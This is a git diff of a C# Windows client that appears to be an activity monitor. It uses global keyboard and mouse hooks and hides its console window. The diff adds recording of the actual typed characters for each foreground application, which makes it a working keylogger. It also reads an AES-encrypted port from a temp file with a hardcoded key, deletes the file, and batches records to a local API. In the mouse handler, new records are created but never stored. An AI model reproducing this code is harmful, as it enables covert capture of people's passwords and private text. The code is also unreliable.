@@ -1,5 +1,6 @@
 ﻿using Gma.System.MouseKeyHook;
 using System;
+using System.Linq;
 using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Threading.Tasks;
@@ -7,12 +8,20 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace amClient
 {
     class Program
     {
-        private static Dictionary<string, int> appGlobalCounter = new Dictionary<string, int>();
+        private static string ACTIVITY_TYPE_APPLICATION = "Application";
+        private static string ACTIVITY_TYPE_URL = "URL";
+
+        private static string localHost = string.Empty;
+
+        private static List<amModel> monitoringList = new List<amModel>();
 
         #region Attribute to Control Console Window
 
@@ -29,7 +38,7 @@ namespace amClient
         [DllImport("user32.dll")]
         static extern int GetForegroundWindow();
 
-        [DllImport("user32")]
+        [DllImport("user32.dll")]
         private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);
 
         private static Int32 GetWindowProcessID(Int32 hwnd)
@@ -39,14 +48,17 @@ namespace amClient
             return pid;
         }
 
-
         #endregion
 
         private static IKeyboardMouseEvents m_Events;
 
         public static void Main()
         {
+            //localHost = "http://localhost:5000";
             //Console.Title = "Testing";
+
+            localHost = string.Format("http://localhost:{0}", GetLocalHostPort());
+
             Console.Title = "amMiddle Start";
 
             IntPtr hWnd = FindWindow(null, "amMiddle Start");
@@ -63,6 +75,49 @@ namespace amClient
             SubscribeGlobal();
 
             Application.Run();
+        }
+
+        private static string GetLocalHostPort()
+        {
+            string port = string.Empty;
+            string filePath = "C:\\Temp\\VivaLaVida.txt";
+            string cipherText = string.Empty;
+
+            if (File.Exists(filePath))
+            {
+                using (StreamReader sr = File.OpenText(filePath))
+                {
+                    cipherText = sr.ReadToEnd();
+                }
+                File.Delete(filePath);
+
+                var fullCipher = Convert.FromBase64String(cipherText);
+
+                var iv = new byte[16];
+                var cipher = new byte[16];
+
+                Buffer.BlockCopy(fullCipher, 0, iv, 0, iv.Length);
+                Buffer.BlockCopy(fullCipher, iv.Length, cipher, 0, iv.Length);
+                var key = Encoding.UTF8.GetBytes("Gu3G4nt3ngB4ng3t");
+
+                using (var aesAlg = Aes.Create())
+                {
+                    using (var decryptor = aesAlg.CreateDecryptor(key, iv))
+                    {
+                        using (var msDecrypt = new MemoryStream(cipher))
+                        {
+                            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                            {
+                                using (var srDecrypt = new StreamReader(csDecrypt))
+                                {
+                                    port = srDecrypt.ReadToEnd();
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            return port;
         }
 
         private static void SubscribeGlobal()
@@ -101,16 +156,36 @@ namespace amClient
                 hwnd = GetForegroundWindow();
                 string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
 
-                var monitor = new amModel();
-                monitor.amModelId = Guid.NewGuid().ToString();
-                monitor.ApplicationName = appProcessName;
-                monitor.InputType = "Keyboard";
-                monitor.KeyStrokeCount = 1;
-                monitor.MouseClickCount = 0;
-                monitor.StartTime = DateTime.Now;
-                monitor.EndTime = DateTime.Now;
+                if (monitoringList.Exists(monitor => monitor.ActivityName == appProcessName))
+                {
+                    var monitor = monitoringList.Where(a => a.ActivityName == appProcessName).OrderByDescending(b => b.StartTime).FirstOrDefault();
+                    monitor.KeyStrokeCount++;
+                    monitor.InputKey = string.Concat(monitor.InputKey, e.KeyChar.ToString());
+                    monitor.EndTime = DateTime.Now;
+                }
+                else
+                {
+                    if(monitoringList.Count > 0)
+                    {
+                        CreateMonitoringAsync(monitoringList);
+                        monitoringList = new List<amModel>();
+                    }
 
-                CreateMonitoringAsync(monitor);
+                    var monitor = new amModel();
+                    monitor.amModelId = Guid.NewGuid().ToString();
+                    monitor.ActivityName = appProcessName;
+                    monitor.ActivityType = ACTIVITY_TYPE_APPLICATION;
+                    monitor.InputKey = e.KeyChar.ToString();
+                    monitor.KeyStrokeCount = 1;
+                    monitor.MouseClickCount = 0;
+                    monitor.StartTime = DateTime.Now;
+                    monitor.EndTime = DateTime.Now;
+                    monitor.IsSuccessSendToServer = false;
+
+                    monitoringList.Add(monitor);
+                }
+
+                //CreateMonitoringAsync(monitor);
             }
             catch (Exception ex)
             {
@@ -126,16 +201,32 @@ namespace amClient
                 hwnd = GetForegroundWindow();
                 string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
 
-                var monitor = new amModel();
-                monitor.amModelId = Guid.NewGuid().ToString();
-                monitor.ApplicationName = appProcessName;
-                monitor.InputType = "Mouse";
-                monitor.KeyStrokeCount = 0;
-                monitor.MouseClickCount = 1;
-                monitor.StartTime = DateTime.Now;
-                monitor.EndTime = DateTime.Now;
+                if (monitoringList.Exists(monitor => monitor.ActivityName == appProcessName))
+                {
+                    var monitor = monitoringList.Where(a => a.ActivityName == appProcessName).OrderByDescending(b => b.StartTime).FirstOrDefault();
+                    monitor.MouseClickCount++;
+                    //monitor.InputKey = string.Concat(monitor.InputKey, e.KeyChar.ToString());
+                    monitor.EndTime = DateTime.Now;
+                }
+                else
+                {
+                    if (monitoringList.Count > 0)
+                    {
+                        CreateMonitoringAsync(monitoringList);
+                        monitoringList = new List<amModel>();
+                    }
 
-                CreateMonitoringAsync(monitor);
+                    var monitor = new amModel();
+                    monitor.amModelId = Guid.NewGuid().ToString();
+                    monitor.ActivityName = appProcessName;
+                    monitor.ActivityType = ACTIVITY_TYPE_APPLICATION;
+                    monitor.KeyStrokeCount = 0;
+                    monitor.MouseClickCount = 1;
+                    monitor.StartTime = DateTime.Now;
+                    monitor.EndTime = DateTime.Now;
+                    monitor.IsSuccessSendToServer = false;
+                }
+                //CreateMonitoringAsync(monitor);
             }
             catch (Exception ex)
             {
@@ -149,24 +240,23 @@ namespace amClient
 
         static async Task RunAsync()
         {
-            // New code:
-            client.BaseAddress = new Uri("http://localhost:5000");
+            client.BaseAddress = new Uri(localHost);
             client.DefaultRequestHeaders.Accept.Clear();
             client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
         }
 
-        static async Task<amModel> GetMonitoringModelSampleData(string path)
-        {
-            amModel monitor = null;
-            HttpResponseMessage response = await client.GetAsync(path);
-            if (response.IsSuccessStatusCode)
-            {
-                monitor = await response.Content.ReadAsAsync<amModel>();
-            }
-            return monitor;
-        }
+        //static async Task<amModel> GetMonitoringModelSampleData(string path)
+        //{
+        //    amModel monitor = null;
+        //    HttpResponseMessage response = await client.GetAsync(path);
+        //    if (response.IsSuccessStatusCode)
+        //    {
+        //        monitor = await response.Content.ReadAsAsync<List<amModel>>();
+        //    }
+        //    return monitor;
+        //}
 
-        static async Task<Uri> CreateMonitoringAsync(amModel monitor)
+        static async Task<Uri> CreateMonitoringAsync(List<amModel> monitor)
         {
             HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/Process", monitor);
             response.EnsureSuccessStatusCode();
